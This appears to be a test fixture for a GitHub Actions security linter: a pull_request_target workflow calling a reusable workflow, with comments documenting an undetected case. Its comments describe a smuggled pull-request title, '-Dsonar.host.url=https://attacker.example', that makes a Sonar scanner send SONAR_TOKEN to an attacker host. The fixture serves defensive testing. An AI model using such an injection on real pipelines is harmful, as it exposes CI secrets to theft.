# situation: a job calls the reusable workflow .github/workflows/w.yml of
#   the repository example-org/request-forgery-unanswered, whose content is
#   the workflow of the true positive action-input (action-input.yml) of the
#   rule, with on: workflow_call in place of the on of action-input.yml. The
#   linter has no answer of the fact workflow.definition for the reusable
#   workflow.
# reason: a todo (a fact): the jobs of a reusable workflow run on the event
#   that started the run of the calling job, and the linter does not read
#   the reusable workflow.
# cause: the rule reads a reusable workflow of another repository only from
#   the answer of workflow.definition.
# attack: the author of a pull request from a fork titles the pull request x
#   -Dsonar.host.url=https://attacker.example.
# attack-run-behavior: the scanner takes https://attacker.example as the
#   server and sends its requests there with Authorization: Bearer and the
#   value of SONAR_TOKEN.
on:
  pull_request_target:
permissions: {}
jobs:
  c:
    uses: example-org/request-forgery-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
